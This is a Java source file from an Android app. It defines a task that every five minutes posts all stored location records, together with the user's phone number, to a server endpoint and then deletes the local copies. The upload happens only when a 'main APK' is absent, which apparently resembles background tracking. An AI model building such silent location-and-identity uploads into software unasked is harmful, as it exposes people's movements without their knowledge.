package com.m1.android.data.action;

import java.util.HashMap;
import java.util.List;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.m1.android.data.dao.LocationDao;
import com.m1.android.data.entity.Location;
import com.m1.android.data.entity.Result;
import com.m1.android.data.util.AppUtil;

public class UpLocationAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				List<Location> locations = LocationDao.getAllLocations(mContext);
				if (locations != null && !locations.isEmpty()) {
					Result result = null;
					if (mUser.isUploadLocation() && !AppUtil.isMainApkInstalled(mContext)) {
						HashMap<String, String> params = new HashMap<String, String>();
						params.put("phone", mPhone);
						Gson gson = new GsonBuilder().excludeFieldsWithoutExposeAnnotation().create();
						params.put("locations", gson.toJson(locations));
						result = mHttpWrapper.post(getRequestUrl(), params, Result.class);
					} else {
						result = new Result();
						result.setSuccess(true);
					}
					// 如果上传成功，移除本地记录
					if (result != null && result.isSuccess()) {
						for (Location location : locations) {
							LocationDao.deleteLocation(mContext, location.getId());
						}
					}
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/uploadLocation.htm";
	}

	@Override
	public long getExcutePeriod() {
		return 5 * 60 * 1000;
	}

}
